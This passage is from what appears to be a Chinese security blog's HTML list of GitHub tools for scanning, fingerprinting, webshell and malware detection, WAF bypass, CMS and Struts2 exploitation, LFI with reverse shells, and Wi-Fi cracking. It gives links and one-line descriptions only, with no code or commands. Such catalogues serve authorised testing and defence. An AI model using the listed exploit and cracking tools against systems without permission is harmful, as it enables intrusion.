class="line">https://github.com/FeeiCN/GSIL</span><br></pre></td></tr></table></figure><p>(Github泄露巡航工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/MiSecurity/x-patrol</span><br></pre></td></tr></table></figure><p>(Web站点信息搜集工具，包括邮箱，电话等信息)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/1N3/BlackWidow</span><br></pre></td></tr></table></figure><p>(集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/anshumanbh/git-all-secrets</span><br></pre></td></tr></table></figure><p>(可以提取网址，电子邮件，文件，网站帐户等的高速爬虫)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/Photon</span><br></pre></td></tr></table></figure><p>(一款简单的webshell检测工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/he1m4n6a/findWebshell</span><br></pre></td></tr></table></figure><p>(哈勃分析系统，LINUX系统病毒分析及安全检测)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Tencent/HaboMalHunter</span><br></pre></td></tr></table></figure><p>(使用python实现的集成ClamAV，ESET，Bitdefender的反病毒引擎)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PlagueScanner/PlagueScanner</span><br></pre></td></tr></table></figure><p>(一款高效率PHP-webshell扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nbs-system/php-malware-finder</span><br></pre></td></tr></table></figure><p>(测试效率高达99%的webshell检测工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/emposha/PHP-Shell-Detector/</span><br></pre></td></tr></table></figure><p>(一款简洁的的Webshell扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/erevus-cn/scan_webshell</span><br></pre></td></tr></table></figure><p>(Webshell扫描工具，支持php / perl / asp / aspx webshell扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/emposha/Shell-Detector</span><br></pre></td></tr></table></figure><p>(一款木马，僵尸网络分析框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m4rco-/dorothy2</span><br></pre></td></tr></table></figure><p>(高级安卓木马病毒分析框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/droidefense/engine</span><br></pre></td></tr></table></figure><p>(基于网络流量的内网探测框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lcatro/network_backdoor_scanner</span><br></pre></td></tr></table></figure><p>(调用Windows API枚举用户登录信息)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fdiskyou/hunter</span><br></pre></td></tr></table></figure><p>(自动化利用XSS入侵内网)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BlackHole1/WebRtcXSS</span><br></pre></td></tr></table></figure><p>(目标端口扫描+系统服务指纹识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ring04h/wyportmap</span><br></pre></td></tr></table></figure><p>(动态多线程敏感信息泄露检测工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ring04h/weakfilescan</span><br></pre></td></tr></table></figure><p>(WAF产品指纹识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br></pre></td></tr></table></figure><p>(SSL类型识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rbsec/sslscan</span><br></pre></td></tr></table></figure><p>(Web指纹识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/urbanadventurer/whatweb</span><br></pre></td></tr></table></figure><p>(Web应用指纹识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tanjiti/FingerPrint</span><br></pre></td></tr></table></figure><p>(网络爬虫式指纹识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nanshihui/Scan-T</span><br></pre></td></tr></table></figure><p>(基于Masscan和Zmap的网络扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/OffensivePython/Nscan</span><br></pre></td></tr></table></figure><p>(网络资产信息扫描，ICMP存活探测，端口扫描，端口指纹服务识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ywolf/F-NAScan</span><br></pre></td></tr></table></figure><p>(中间件扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ywolf/F-MiddlewareScan</span><br></pre></td></tr></table></figure><p>(web路径收集与扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/maurosoria/dirsearch</span><br></pre></td></tr></table></figure><p>(C段横幅与路径扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/x0day/bannerscan</span><br></pre></td></tr></table></figure><p>(端口服务扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/RASSec/RASscan</span><br></pre></td></tr></table></figure><p>(waf自动暴破)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3xp10it/bypass_waf</span><br></pre></td></tr></table></figure><p>(尝试找出cdn背后的真实ip)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3xp10it/xcdn</span><br></pre></td></tr></table></figure><p>(基于Bing搜索引擎的C段/旁站查询，多线程，支持API)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Xyntax/BingC</span><br></pre></td></tr></table></figure><p>(多线程WEB目录爆破工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Xyntax/DirBrute</span><br></pre></td></tr></table></figure><p>(一个爬虫式的网段Web主机发现小工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zer0h/httpscan</span><br></pre></td></tr></table></figure><p>(Thorn上实现的分布式任务分发的ip端口漏洞扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lietdai/doom</span><br></pre></td></tr></table></figure><p>(类似zgrab的快速TCP指纹抓取解析工具，支持更多协议)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/chichou/grab.js</span><br></pre></td></tr></table></figure><p>(CDN识别，检测)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Nitr4x/whichCDN</span><br></pre></td></tr></table></figure><p>(基于爬虫的web路径扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secfree/bcrpscan</span><br></pre></td></tr></table></figure><p>(服务器ssh配置信息扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mozilla/ssh_scan</span><br></pre></td></tr></table></figure><p>(针对域名及其子域名的资产数据检测/扫描，包括http / https检测等)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/18F/domain-scan</span><br></pre></td></tr></table></figure><p>(域名资产收集及指纹识别工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ggusoft/inforfinder</span><br></pre></td></tr></table></figure><p>(CMS识别python gevent实现)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/boy-hack/gwhatweb</span><br></pre></td></tr></table></figure><p>(敏感文件扫描/二次判断降低误报率/扫描内容规则化/多目录扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Mosuan/FileScan</span><br></pre></td></tr></table></figure><p>(基于爬虫的动态敏感文件探测工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Xyntax/FileSensor</span><br></pre></td></tr></table></figure><p>(web路径扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/deibit/cansina</span><br></pre></td></tr></table></figure><p>(网络设备web服务指纹扫描与检索)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/0xbug/Howl</span><br></pre></td></tr></table></figure><p>(目标主机服务ssl类型识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mozilla/cipherscan</span><br></pre></td></tr></table></figure><p>(Web应用fuzz工具，框架，同时可用于web路径/服务扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/xmendez/wfuzz</span><br></pre></td></tr></table></figure><p>(多线程的后台路径扫描器，也可用于发现重定向漏洞后执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/Breacher</span><br></pre></td></tr></table></figure><p>(弱口令扫描器，不仅支持普通登录页，也支持ssh，mongodb等组件)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ztgrace/changeme</span><br></pre></td></tr></table></figure><p>(渗透测试辅助工具，支持分析数据包，解码，端口扫描，IP地址分析等)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/medbenali/CyberScan</span><br></pre></td></tr></table></figure><p>(基于nmap的扫描器，与cve漏洞关联)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m0nad/HellRaiser</span><br></pre></td></tr></table></figure><p>(基于nmap的高级漏洞扫描器，命令行环境使用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/scipag/vulscan</span><br></pre></td></tr></table></figure><p>(web应用信息搜集工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jekyc/wig</span><br></pre></td></tr></table></figure><p>(围绕web服务的域名进行信息收集和“域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/eldraco/domain_analyzer</span><br></pre></td></tr></table></figure><p>(基于Nikto扫描规则的被动式路径扫描以及信息爬虫)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cloudtracer/paskto</span><br></pre></td></tr></table></figure><p>(快速识别WEB服务器类型，CMS类型，WAF类型，WHOIS信息，以及语言框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zerokeeper/WebEye</span><br></pre></td></tr></table></figure><p>(用于检查web服务的http header的安全性)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m3liot/shcheck</span><br></pre></td></tr></table></figure><p>(一款高效快捷的敏感文件扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/aipengjie/sensitivefilescan</span><br></pre></td></tr></table></figure><p>(通过字典穷举，google，robots.txt等途径的跨平台后台管理路径扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fnk0c/cangibrina</span><br></pre></td></tr></table></figure><p>(常规CMS指纹识别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n4xh4ck5/CMSsc4n</span><br></pre></td></tr></table></figure><p>(WAF指纹识别及自动化绕过工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Ekultek/WhatWaf</span><br></pre></td></tr></table></figure><p>(网络应用模糊工具，框架，同时可用于网络路径/服务扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/dzonerzy/goWAPT</span><br></pre></td></tr></table></figure><p>(web敏感目录/信息泄漏扫描脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/blackye/webdirdig</span><br></pre></td></tr></table></figure><p>(用于网站或IP地址的信息收集工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GitHackTools/BillCipher</span><br></pre></td></tr></table></figure><p>(通过扫描全网获得真实IP的自动化程序)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/boy-hack/w8fuckcdn</span><br></pre></td></tr></table></figure><p>(分布式WEB指纹识别平台)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/boy-hack/w11scan</span><br></pre></td></tr></table></figure><p>(爬虫式web目录扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Nekmo/dirhunt</span><br></pre></td></tr></table></figure><p>(Jenkins漏洞探测，用户抓取爆破)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/blackye/Jenkins</span><br></pre></td></tr></table></figure><p>(首款集成化的Discuz扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/code-scan/dzscan</span><br></pre></td></tr></table></figure><p>(一款简洁优雅的CMS扫描利用框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/chuhades/CMS-Exploit-Framework</span><br></pre></td></tr></table></figure><p>(IIS短文件名暴力枚举漏洞利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/IIS_shortname_Scanner</span><br></pre></td></tr></table></figure><p>(flashxss扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/riusksk/FlashScanner</span><br></pre></td></tr></table></figure><p>(一个起毛服务器端模板注入漏洞的半自动化工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/coffeehb/SSTIF</span><br></pre></td></tr></table></figure><p>(服务器端模板注入漏洞检测与利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure><p>(Docker扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cr0hn/dockerscan</span><br></pre></td></tr></table></figure><p>(一款精简的wordpress扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m4ll0k/WPSeku</span><br></pre></td></tr></table></figure><p>(集成化wordpress漏洞利用框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rastating/wordpress-exploit-framework</span><br></pre></td></tr></table></figure><p>(用于扫描J2EE应用的一款burpsuite插件)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ilmila/J2EEScan</span><br></pre></td></tr></table></figure><p>(一款基于perl的strut2的历史漏洞扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/riusksk/StrutScan</span><br></pre></td></tr></table></figure><p>(本地文件包含漏洞利用及扫描工具，支持反弹shell)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/D35m0nd142/LFISuite</span><br></pre></td></tr></table></figure><p>(基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA，slack平台结合使用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/0x4D31/salt-scanner</span><br></pre></td></tr></table></figure><p>(自动化探测客户端AngularJS模板注入漏洞工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tijme/angularjs-csti-scanner</span><br></pre></td></tr></table></figure><p>(Java编写的IIS短文件名暴力枚举漏洞利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/irsdl/IIS-ShortName-Scanner</span><br></pre></td></tr></table></figure><p>(基于WPScan以及WPSeku的优化版wordpress扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/swisskyrepo/Wordpresscan</span><br></pre></td></tr></table></figure><p>(CMS渗透测试框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/CHYbeta/cmsPoc</span><br></pre></td></tr></table></figure><p>(CRLF注入漏洞批量扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rudSarkar/crlf-injector</span><br></pre></td></tr></table></figure><p>(自动化扫描内网中存在的由影子经纪人泄露的ETERNAL系列漏洞)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3gstudent/Smbtouch-Scanner</span><br></pre></td></tr></table></figure><p>(通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/utiso/dorkbot</span><br></pre></td></tr></table></figure><p>(本地文件包含漏洞利用及扫描工具，支持反弹shell)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/OsandaMalith/LFiFreak</span><br></pre></td></tr></table></figure><p>(用于枚举脚本的GET / POST未知参数字段)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mak-/parameth</span><br></pre></td></tr></table></figure><p>(struts2的漏洞全版本检测和利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Lucifer1993/struts-scan</span><br></pre></td></tr></table></figure><p>(SSL漏洞扫描，例如心脏滴血漏洞等)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hahwul/a2sv</span><br></pre></td></tr></table></figure><p>(基于搜索引擎的漏洞网页搜寻)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/NullArray/DorkNet</span><br></pre></td></tr></table></figure><p>(用于攻击爆破Java RemoteMethod Invocation服务的工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/NickstaDB/BaRMIe</span><br></pre></td></tr></table></figure><p>(扫描js扩展库的常见漏洞)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/RetireJS/grunt-retire</span><br></pre></td></tr></table></figure><p>(针对的hadoop /火花等大数据平台的的漏洞探测工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/kotobukki/BDA</span><br></pre></td></tr></table></figure><p>(RegEx拒绝服务扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jagracey/Regex-DoS</span><br></pre></td></tr></table></figure><p>(使用NMAP扫描的Tor网络上隐藏的“洋葱”服务)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/milesrichardson/docker-onion-nmap</span><br></pre></td></tr></table></figure><p>(Web CMS Exploit工具，包含针对主流CMS的66个不同的漏洞利用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Moham3dRiahi/XAttacker</span><br></pre></td></tr></table></figure><p>(一个迷你的信息泄漏批量扫描脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/BBScan</span><br></pre></td></tr></table></figure><p>(文件上传漏洞扫描器及利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/almandin/fuxploider</span><br></pre></td></tr></table></figure><p>(子域名接管漏洞检测工具，支持30+云服务托管检测)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Ice3man543/SubOver</span><br></pre></td></tr></table></figure><p>(WordPress的漏洞扫描器，同时也支持敏感文件泄露扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Jamalc0m/wphunter</span><br></pre></td></tr></table></figure><p>(检测网站依赖的JavaScript库中存在的已知通用漏洞)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/retirejs/retire.js</span><br></pre></td></tr></table></figure><p>(自动检测上传功能是否可上传webshell)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3xp10it/xupload</span><br></pre></td></tr></table></figure><p>(CMS指纹识别及自动化渗透测试框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mobrine-mob/M0B-tool</span><br></pre></td></tr></table></figure><p>(论坛框架vBulletin黑盒漏洞扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rezasp/vbscan</span><br></pre></td></tr></table></figure><p>(CMS指纹识别及自动化渗透测试框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/MrSqar-Ye/BadMod</span><br></pre></td></tr></table></figure><p>(CMS漏洞检测和利用套件)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Tuhinshubhra/CMSeeK</span><br></pre></td></tr></table></figure><p>(AWS安全审计工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cloudsploit/scans</span><br></pre></td></tr></table></figure><p>(针对wp，magento，joomla等CMS的漏洞扫描器及自动利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/radenvodka/SVScanner</span><br></pre></td></tr></table></figure><p>(OWASP旗下joomla漏洞扫描项目)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rezasp/joomscan</span><br></pre></td></tr></table></figure><p>(用于检测因错误配置导致敏感信息暴露的Django应用程序)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/6IX7ine/djangohunter</span><br></pre></td></tr></table></figure><p>(无线安全审计工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/savio-code/fern-wifi-cracker/</span><br></pre></td></tr></table></figure><p>(Python网络/渗透测试工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m4n3dw0lf/PytheM</span><br></pre></td></tr></table></figure><p>(无线安全渗透测试套件)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/P0cL4bs/WiFi-Pumpkin</span><br></pre></td></tr></table></figure><p>(无线网络审计工具，支持2-5GHZ频段)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/MisterBianco/BoopSuite</span><br></pre></td></tr></table></figure><p>(ARP欺骗，无线网络劫持)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/DanMcInerney/LANs.py</span><br></pre></td></tr></table></figure><p>(检查wifi是否是“大菠萝”所开放的热点，并给予网络评分)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/besimaltnok/PiFinger</span><br></pre></td></tr></table></figure><p>(自动化无线网络攻击工具wifite的重构版本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/derv82/wifite2</span><br></pre></td></tr></table></figure><p>(基于BBScan via.lijiejie的本地网络扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sowish/LNScan</span><br></pre></td></tr></table></figure><p>(基于JavaScript的的本地网络扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SkyLined/LocalNetworkScanner</span><br></pre></td></tr></table></figure><p>(白盒代码安全审计系统)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 